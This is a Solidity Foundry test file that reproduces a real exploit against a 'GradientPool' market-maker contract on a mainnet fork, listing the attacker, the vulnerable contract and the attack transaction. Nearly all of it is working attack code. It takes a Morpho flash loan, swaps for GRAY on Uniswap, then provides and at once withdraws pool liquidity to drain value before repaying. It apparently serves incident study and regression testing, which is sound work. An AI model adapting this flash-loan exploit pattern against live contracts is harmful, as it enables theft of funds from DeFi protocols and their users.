// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 5k USD
// Attacker : https://etherscan.io/address/0x1234567a98230550894bf93e2346a8bc5c3b36e3
// Attack Contract : https://etherscan.io/address/0xcb4059bb021f4cf9d90267b7961125210cedb792
// Vulnerable Contract : https://etherscan.io/address/0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC
// Attack Tx : https://etherscan.io/tx/0xb5cfa3f86ce9506e2364475dc43c44de444b079d4752edbffcdad7d1654b1f67

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC#code

// @Analysis
// Post-mortem : https://t.me/defimon_alerts/1340
// Twitter Guy : N/A
// Hacking God : N/A
pragma solidity ^0.8.0;

contract GradientPool is BaseTestWithBalanceLog {
   
   // State variables
    uint256 private constant blocknumToForkFrom = 22765113; // blocknumToForkFrom - 1
    uint256 private constant BORROW_AMOUNT = 3 ether; // 3e18 wei (3000000000000000000)
    uint256 private constant WETH_WITHDRAW_AMOUNT = 1 ether;
    uint256 private constant SWAP_AMOUNT_OUT = 1000 ether; // 1000e18
    uint256 private constant SWAP_AMOUNT_IN_MAX = 1000 ether; // 1000e18
    uint256 private constant LIQUIDITY_AMOUNT = 950 ether; // 950e18
    uint256 private constant WITHDRAW_SHARES = 10000;
    uint256 private constant WETH_DEPOSIT_AMOUNT = 4.010899131704627093 ether; // Precise wei value
    uint256 private constant DEADLINE = 1750657343;

    IGradientMarketMakerPool gradientPool = IGradientMarketMakerPool(0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC);
    IMorphoBuleFlashLoan morphoBlue = IMorphoBuleFlashLoan(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
    IWETH weth = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IUniswapV2Router router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    IERC20 gray = IERC20(0xa776A95223C500E81Cb0937B291140fF550ac3E4);



    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(weth);
    }

    function testExploit() public balanceLog {
        //implement exploit code here
        morphoBlue.flashLoan(address(weth), BORROW_AMOUNT, "");
    }

    function onMorphoFlashLoan(uint256 amount, bytes calldata /* data */) external {
        // Approve Morpho for repayment
        weth.approve(address(morphoBlue), BORROW_AMOUNT);

        // Withdraw WETH to ETH
        weth.withdraw(WETH_WITHDRAW_AMOUNT);

        // Approve Uniswap router for WETH
        weth.approve(address(router), WETH_WITHDRAW_AMOUNT);

        // Swap WETH for GRAY on Uniswap
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(gray);
        router.swapTokensForExactTokens(
            SWAP_AMOUNT_OUT,
            SWAP_AMOUNT_IN_MAX,
            path,
            address(this),
            DEADLINE
        );
        

        // Approve GradientPool for GRAY
        gray.approve(address(gradientPool), type(uint256).max);

        // Provide liquidity to GradientPool with ETH
        uint256 ethAmount =  632090074270700494;
        gradientPool.provideLiquidity{value: ethAmount}(address(gray), LIQUIDITY_AMOUNT, 0);
        

        // Withdraw liquidity
        gradientPool.withdrawLiquidity(address(gray), WITHDRAW_SHARES);
      

        // Deposit ETH back to WETH for repayment
        weth.deposit{value: WETH_DEPOSIT_AMOUNT}();

    }

     // Fallback to receive ETH from WETH withdraw
    receive() external payable {}
}


interface IGradientMarketMakerPool {
    function provideLiquidity(
        address token,
        uint256 tokenAmount,
        uint256 minTokenAmount
    ) external payable;

    function withdrawLiquidity(
        address token,
        uint256 shares
    ) external;
}


